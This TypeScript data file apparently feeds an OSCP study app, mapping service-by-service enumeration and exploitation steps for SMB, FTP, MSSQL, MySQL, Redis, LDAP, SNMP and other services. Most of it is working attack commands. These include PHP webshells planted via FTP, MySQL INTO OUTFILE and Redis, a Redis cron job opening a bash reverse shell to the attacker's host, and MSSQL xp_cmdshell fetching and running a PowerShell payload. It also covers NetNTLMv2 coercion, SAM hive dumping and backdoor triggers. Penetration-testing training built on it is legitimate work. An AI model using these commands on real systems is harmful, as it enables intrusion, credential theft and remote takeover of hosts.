import type { OscpContent } from '@/types/oscp'

/** Phase: per-service enumeration playbooks. */
const serviceEnum: OscpContent = {
    nodes: [
        {
            id: 'smb-enum',
            title: 'Enumerate SMB',
            type: 'technique',
            phase: 'service-enum',
            os: 'windows',
            description:
                'Check the version (ms17-010, and ms08-067 / ms09-050 on XP-era boxes), then list shares and users - anonymously and with any creds you hold.',
            commands: [
                {
                    label: 'Version + vuln scripts',
                    code: 'nmap -p445 --script "smb-os-discovery,smb-protocols,smb-vuln-ms17-010,smb-vuln-ms08-067" <target>',
                },
                {
                    label: 'List shares (null / guest / creds)',
                    code: `smbclient -L //<target>/ -N
netexec smb <target> -u '' -p '' --shares
netexec smb <target> -u guest -p '' --shares`,
                },
                {
                    label: 'Full enum',
                    code: 'enum4linux-ng -A <target>',
                },
                {
                    label: 'NetBIOS + net view',
                    code: `nbtscan -r <subnet>/24
net view \\\\<dc> /all
nmblookup -A <target>`,
                },
            ],
            tags: ['smb', 'netexec', 'crackmapexec', 'enum4linux', 'shares'],
        },
        {
            id: 'smb-anon-access',
            title: 'Anonymous/guest SMB access',
            type: 'finding',
            phase: 'service-enum',
            os: 'windows',
            description:
                'A null or guest session lists (and maybe reads/writes) shares. Loot every readable share; a writable share in a web root or startup path is a foothold.',
            commands: [
                {
                    label: 'Connect + recurse a share',
                    code: `smbclient //<target>/<share> -N
smb: \\> recurse ON
smb: \\> prompt OFF
smb: \\> mget *`,
                },
                {
                    label: 'Mirror a whole share',
                    code: "netexec smb <target> -u '' -p '' -M spider_plus",
                },
                {
                    label: 'Writable share -> foothold',
                    code: `smbclient //<target>/<share> -N -c 'put backup.ps1'
# web root share -> webshell; startup share -> persistence`,
                },
                {
                    label: 'Auth as guest + spider',
                    code: "netexec smb <target> -u guest -p '' --shares --spider <share> --pattern txt,ps1,xml,ini,conf",
                },
                {
                    label: 'Backup share -> SAM/SYSTEM hives',
                    code: `# a Backups share often holds registry hives / .bak files:
smbclient //<target>/Backups -N -c 'prompt OFF; recurse ON; mget *'
# if SAM + SYSTEM (or .bak hives) are inside:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL`,
                },
            ],
            tags: ['smb', 'null-session', 'guest', 'shares', 'loot'],
        },
        {
            id: 'ms17-010',
            title: 'SMB version is vulnerable',
            type: 'finding',
            phase: 'service-enum',
            os: 'windows',
            description:
                'Old SMBv1 (ms17-010 EternalBlue) or a flagged CVE. Go straight to a public exploit.',
            commands: [
                {
                    label: 'Confirm EternalBlue',
                    code: `nmap -p445 --script smb-vuln-ms17-010 <target>
netexec smb <target> -M ms17-010`,
                },
                {
                    label: 'Public exploit (read first)',
                    code: `searchsploit ms17-010
# MSF only if allowed: exploit/windows/smb/ms17_010_eternalblue`,
                },
            ],
            tags: ['ms17-010', 'eternalblue', 'cve', 'smbv1'],
        },
        {
            id: 'ftp-enum',
            title: 'Enumerate FTP',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Try anonymous login; note the exact banner (vsftpd 2.3.4 is a backdoor). Check whether the FTP root is the web root - a writable one = webshell.',
            commands: [
                {
                    label: 'Anonymous login',
                    code: `ftp <target>       # user: anonymous, pass: anything
# or non-interactive:
wget -m --no-passive ftp://anonymous:anonymous@<target>`,
                },
                {
                    label: 'Banner + vsftpd 2.3.4',
                    code: `nc -nv <target> 21
# vsftpd 2.3.4 backdoor: USER <anything>:)
# then connect to port 6200 for a root shell`,
                },
                {
                    label: 'List + download',
                    code: `curl ftp://anonymous:anonymous@<target>/
wget -m --no-passive ftp://anonymous:anonymous@<target>`,
                },
            ],
            tags: ['ftp', '21', 'anonymous', 'vsftpd'],
        },
        {
            id: 'ftp-anon-writable',
            title: 'FTP anonymous + writable',
            type: 'finding',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'You can upload. If the FTP directory is served by the web server, drop a webshell and browse to it.',
            commands: [
                {
                    label: 'Drop a webshell via FTP',
                    code: `echo '<?php system($_GET["c"]); ?>' > sh.php
ftp -n <target> <<'EOF'
user anonymous anonymous
binary
put sh.php
quit
EOF
curl "http://<target>/sh.php?c=id"`,
                },
                {
                    label: 'Confirm write + locate the web root',
                    code: `ftp -n <target> <<'EOF'
user anonymous anonymous
pwd
ls -la
mkdir testdir
quit
EOF
# if FTP root maps to the web root, the uploaded sh.php is immediate RCE`,
                },
            ],
            tags: ['ftp', 'upload', 'webshell'],
        },
        {
            id: 'ssh-enum',
            title: 'Enumerate SSH',
            type: 'technique',
            phase: 'service-enum',
            os: 'linux',
            description:
                'Grab the version and supported auth methods. Password auth -> brute a known user. Found a private key elsewhere? Use it here.',
            commands: [
                {
                    label: 'Auth methods',
                    code: 'ssh -v <user>@<target>   # watch for publickey/password',
                },
                {
                    label: 'Banner + auth methods',
                    code: `nc -nv <target> 22
nmap -p22 --script ssh-auth-methods,ssh-hostkey <target>
ssh-keyscan -t rsa,ecdsa,ed25519 <target>`,
                },
                {
                    label: 'Key auth',
                    code: `chmod 600 id_rsa
ssh -i id_rsa -o IdentitiesOnly=yes <user>@<target>
# encrypted key -> ssh2john + john/hashcat -m 22921 / 10300`,
                },
            ],
            tags: ['ssh', '22', 'openssh'],
        },
        {
            id: 'snmp-enum',
            title: 'Enumerate SNMP',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'With a community string (try public), walk the MIB for users, running processes (with full command lines - often creds), installed software and listening ports.',
            commands: [
                {
                    label: 'Walk everything',
                    code: `snmpwalk -c public -v2c <target>
# targeted: users, processes, installed software, ports
snmpwalk -c public -v2c <target> 1.3.6.1.4.1.77.1.2.25    # users
snmpwalk -c public -v2c <target> 1.3.6.1.2.1.25.4.2.1.2   # processes`,
                },
                {
                    label: 'Brute community strings',
                    code: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>',
                },
                {
                    label: 'v1 walk (users / processes)',
                    code: `snmpwalk -c public -v1 <target>
snmpwalk -c public -v1 <target> 1.3.6.1.4.1.77.1.2.25    # Windows users
snmpwalk -c public -v1 <target> 1.3.6.1.2.1.25.4.2.1.2   # running processes`,
                },
                {
                    label: 'nsExtendObjects + hydra brute',
                    code: `# custom OIDs (NET-SNMP-EXTEND-MIB) often leak command output / creds:
snmpwalk -c public -v2c <target> 1.3.6.1.4.1.8072.1.3.2
snmpwalk -c public -v2c <target> NET-SNMP-EXTEND-MIB::nsExtendObjects
# brute community strings with hydra:
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp`,
                },
            ],
            tags: ['snmp', '161', 'udp', 'snmpwalk', 'community'],
        },
        {
            id: 'mssql-enum',
            title: 'Enumerate MSSQL',
            type: 'technique',
            phase: 'service-enum',
            os: 'windows',
            description:
                'With creds, log in and check impersonation and xp_cmdshell. Even without RCE, xp_dirtree/xp_fileexist to a UNC path you control captures NetNTLMv2.',
            commands: [
                {
                    label: 'Connect',
                    code: 'impacket-mssqlclient <user>:<pass>@<target> -windows-auth',
                },
                {
                    label: 'RCE via xp_cmdshell',
                    code: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';`,
                },
                {
                    label: 'Coerce NetNTLMv2 (no RCE needed)',
                    code: "EXEC xp_dirtree '\\\\<kali-ip>\\share', 1, 1;   # capture with responder",
                },
                {
                    label: 'Reverse shell via xp_cmdshell',
                    code: `EXEC xp_cmdshell 'powershell -nop -c "iex (iwr -UseBasicParsing http://<kali-ip>/rev.ps1)"';`,
                },
                {
                    label: 'sqlcmd (native client)',
                    code: `sqlcmd -S localhost\\SQLEXPRESS -U <user> -P <pass> -C -Q "SELECT name FROM sys.databases"
sqlcmd -S localhost\\SQLEXPRESS -U <user> -P <pass> -C -Q "SELECT * FROM <db>.dbo.<table>"
# -C trusts the server cert; -E uses Windows auth`,
                },
            ],
            tags: ['mssql', '1433', 'xp_cmdshell', 'impacket'],
        },
        {
            id: 'mysql-enum',
            title: 'Enumerate MySQL',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Log in with any creds. FILE privilege enables INTO OUTFILE (write a webshell into the web root) and LOAD_FILE (read files).',
            commands: [
                {
                    label: 'Connect + write webshell',
                    code: `mysql -h <target> -u <user> -p
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php';`,
                },
                {
                    label: 'No-pass / default creds',
                    code: `mysql -h <target> -u root -p
mysql -h <target> -u root          # empty pass
netexec mysql <target> -u root -p ''`,
                },
                {
                    label: 'FILE priv + LOAD_FILE',
                    code: `SHOW GRANTS;
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';`,
                },
                {
                    label: 'Dump all DBs for creds (mysqldump)',
                    code: `# on a Windows host with the mysql client:
mysqldump.exe -u root --all-databases > db.sql
findstr /i /s "password passwd" db.sql
# on Linux:
mysqldump -u root --all-databases | grep -iE 'password|passwd'`,
                },
            ],
            tags: ['mysql', '3306', 'outfile', 'file-priv'],
        },
        {
            id: 'ldap-enum',
            title: 'Enumerate LDAP',
            type: 'technique',
            phase: 'service-enum',
            os: 'ad',
            description:
                'An open 389/636 usually means a Domain Controller. Try an anonymous bind and dump the naming context - user lists and description-field passwords fall out here.',
            commands: [
                {
                    label: 'Anonymous bind + base',
                    code: `ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description`,
                },
                {
                    label: 'Authenticated dump',
                    code: `ldapsearch -x -H ldap://<target> -D '<user>@<domain>' -w '<pass>' -b 'DC=corp,DC=com' '(objectClass=user)' sAMAccountName description memberOf
netexec ldap <target> -u <user> -p <pass> --users --groups`,
                },
            ],
            tags: ['ldap', '389', '636', 'dc', 'ldapsearch'],
        },
        {
            id: 'public-exploit-search',
            title: 'Search for a public exploit',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Match the exact product + version to a known exploit. Read the PoC before running it - fix the target IP/port, LHOST, and any hardcoded offsets; run untrusted PoCs in a throwaway VM.',
            commands: [
                {
                    label: 'searchsploit',
                    code: `searchsploit <product> <version>
searchsploit -m <id>          # copy PoC locally
searchsploit -x <id>          # read it first`,
                },
                {
                    label: 'Google / GitHub / nmap scripts',
                    code: `searchsploit -w <product>
ls /usr/share/nmap/scripts | grep -i <product>
# after copy: fix LHOST/LPORT/offsets, run in a throwaway VM`,
                },
                {
                    label: 'Cross-compile Windows exploits',
                    code: `# compile a Windows exploit on Kali:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32
# then transfer + run on the target`,
                },
            ],
            references: [
                { label: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
            ],
            tags: ['searchsploit', 'exploit-db', 'cve', 'poc'],
        },
        {
            id: 'redis-enum',
            title: 'Enumerate Redis',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Redis (6379) is often exposed with no auth. With no password, write your SSH key to ~/.ssh/authorized_keys or plant a root cron job for a reverse shell; on a web box, drop a webshell via a writable web dir.',
            commands: [
                {
                    label: 'No-auth check + SSH key write',
                    code: `redis-cli -h <target> ping
redis-cli -h <target> -x SET mykey < ~/.ssh/id_rsa.pub
redis-cli -h <target> CONFIG SET dir /home/<user>/.ssh
redis-cli -h <target> CONFIG SET dbfilename authorized_keys
redis-cli -h <target> SAVE`,
                },
                {
                    label: 'Cron reverse shell',
                    code: `redis-cli -h <target> CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h <target> CONFIG SET dbfilename root
redis-cli -h <target> SET x '\\n* * * * * bash -i >& /dev/tcp/<kali-ip>/443 0>&1\\n'
redis-cli -h <target> SAVE`,
                },
                {
                    label: 'Webshell via web dir',
                    code: `redis-cli -h <target> CONFIG SET dir /var/www/html
redis-cli -h <target> CONFIG SET dbfilename sh.php
redis-cli -h <target> SET x '<?php system($_GET["c"]); ?>'
redis-cli -h <target> SAVE`,
                },
                {
                    label: 'Module RCE (redis-rogue-server)',
                    code: `# Redis 4.x/5.x with no auth -> load a malicious .so module for RCE:
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server/RedisModulesSDK && make
python3 redis-rogue-server.py -rhost <target> -lhost <kali-ip> -passwd ''
# in the spawned shell: MODULE LOAD /tmp/exp.so ; system.exec 'id'
# cleanup on the box: MODULE UNLOAD system`,
                    note: 'Falls back to master/slave replication RCE on Redis 4.x when module load is blocked.',
                },
            ],
            tags: ['redis', '6379', 'ssh-key', 'cron', 'unauthenticated'],
        },
        {
            id: 'dns-enum',
            title: 'Enumerate DNS',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Port 53 (or any resolver you can query) leaks hostnames, subdomains and mail servers. Zone transfers and reverse lookups map the whole target network.',
            commands: [
                {
                    label: 'Zone transfer + common records',
                    code: `dig axfr @<target> <domain>
dig any <domain> @<target>
dig -x <target> @<target>
host -t ns <domain>; host -t mx <domain>`,
                },
                {
                    label: 'Subdomain brute',
                    code: `dnsrecon -d <domain> -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsenum <domain>`,
                },
            ],
            tags: ['dns', '53', 'zone-transfer', 'dig', 'subdomain'],
        },
        {
            id: 'smtp-enum',
            title: 'Enumerate SMTP',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Port 25/465/587. VRFY, EXPN and RCPT TO enumerate valid users, and the banner leaks the mail server name and version.',
            commands: [
                {
                    label: 'Banner + user enumeration',
                    code: `nc -nv <target> 25
VRFY root
VRFY admin
EXPN root`,
                },
                {
                    label: 'Automated enum (smtp-user-enum)',
                    code: `smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <target>
smtp-user-enum -M RCPT -U users.txt -t <target>`,
                },
            ],
            tags: ['smtp', '25', 'vrfy', 'user-enum'],
        },
        {
            id: 'imap-pop3-enum',
            title: 'Enumerate IMAP / POP3',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Port 110/143/993/995. With creds, log in and read mailboxes - password-reset links, credentials and internal info sit in inboxes.',
            commands: [
                {
                    label: 'POP3 login + read',
                    code: `nc -nv <target> 110
USER <user>
PASS <pass>
LIST
RETR 1`,
                },
                {
                    label: 'IMAP login + list',
                    code: `nc -nv <target> 143
a1 LOGIN <user> <pass>
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]`,
                },
            ],
            tags: ['imap', 'pop3', '110', '143', 'mail'],
        },
        {
            id: 'nfs-enum',
            title: 'Enumerate NFS',
            type: 'technique',
            phase: 'service-enum',
            os: 'linux',
            description:
                'Port 2049 (with rpcbind on 111). showmount lists exports; a mountable share often holds configs, backups or web roots.',
            commands: [
                {
                    label: 'List + mount exports',
                    code: `showmount -e <target>
mkdir /mnt/nfs
sudo mount -t nfs <target>:/<export> /mnt/nfs
ls -la /mnt/nfs`,
                },
                {
                    label: 'nmap NFS scripts',
                    code: `nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target>
rpcinfo -p <target>`,
                },
            ],
            tags: ['nfs', '2049', 'showmount', 'mount'],
        },
    ],
    edges: [
        { from: 'smb-enum', to: 'smb-anon-access', label: 'null/guest allowed' },
        { from: 'smb-enum', to: 'ms17-010', label: 'SMBv1 / CVE flagged' },
        { from: 'ms17-010', to: 'public-exploit-search', label: 'grab the PoC' },
        {
            from: 'smb-anon-access',
            to: 'creds-found',
            label: 'creds in a file on the share',
        },
        {
            from: 'smb-anon-access',
            to: 'ad-null-enum',
            label: 'domain? enumerate users',
        },
        {
            from: 'smb-anon-access',
            to: 'webshell-upload',
            label: 'writable share in web root',
        },
        { from: 'ftp-enum', to: 'ftp-anon-writable', label: 'anon + write' },
        { from: 'ftp-enum', to: 'creds-found', label: 'config/creds on FTP' },
        {
            from: 'ftp-anon-writable',
            to: 'webshell-upload',
            label: 'FTP dir = web root',
        },
        { from: 'ftp-enum', to: 'hydra-brute', label: 'brute a known user' },
        { from: 'ssh-enum', to: 'hydra-brute', label: 'password auth open' },
        {
            from: 'ssh-enum',
            to: 'foothold-linux',
            label: 'valid key or creds',
        },
        { from: 'snmp-enum', to: 'user-list', label: 'users harvested' },
        { from: 'snmp-enum', to: 'creds-found', label: 'creds in process args' },
        {
            from: 'mssql-enum',
            to: 'foothold-windows',
            label: 'xp_cmdshell RCE',
        },
        {
            from: 'mssql-enum',
            to: 'netntlm-captured',
            label: 'xp_dirtree coercion',
        },
        { from: 'mysql-enum', to: 'webshell-upload', label: 'INTO OUTFILE' },
        { from: 'ldap-enum', to: 'ad-null-enum', label: 'anonymous bind works' },
        { from: 'ldap-enum', to: 'user-list', label: 'user list dumped' },
        {
            from: 'public-exploit-search',
            to: 'foothold-linux',
            label: 'exploit lands (Linux)',
        },
        {
            from: 'public-exploit-search',
            to: 'foothold-windows',
            label: 'exploit lands (Windows)',
        },
        { from: 'redis-enum', to: 'foothold-linux', label: 'SSH key / cron -> shell' },
        {
            from: 'smb-anon-access',
            to: 'foothold-windows',
            label: 'writable startup / scheduled script',
        },
        { from: 'dns-enum', to: 'user-list', label: 'hostnames / users harvested' },
        { from: 'dns-enum', to: 'web-dirbust', label: 'subdomains / vhosts found' },
        { from: 'smtp-enum', to: 'user-list', label: 'VRFY / RCPT users' },
        { from: 'imap-pop3-enum', to: 'creds-found', label: 'creds in a mailbox' },
        { from: 'nfs-enum', to: 'nfs-no-root-squash', label: 'no_root_squash export' },
        { from: 'nfs-enum', to: 'creds-found', label: 'config / backup on the share' },
    ],
}

export default serviceEnum
